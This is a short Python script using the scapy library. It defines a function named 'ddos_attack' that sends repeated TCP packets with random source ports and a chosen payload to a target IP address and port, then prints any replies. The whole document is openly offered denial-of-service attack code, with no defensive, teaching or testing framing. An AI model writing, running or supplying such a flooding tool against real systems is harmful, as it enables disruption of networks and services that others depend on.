from scapy.all import *
from random import randint

def ddos_attack(dst_ip, dport, payload, num_packets, verbose=0):
    for i in range(num_packets):
        sport = randint(1024, 65535)
        packet = IP(dst=dst_ip)/TCP(sport=sport, dport=dport)/Raw(load=payload)
        response = sr1(packet, timeout=1, verbose=0)
        if response:
            print(response.summary())
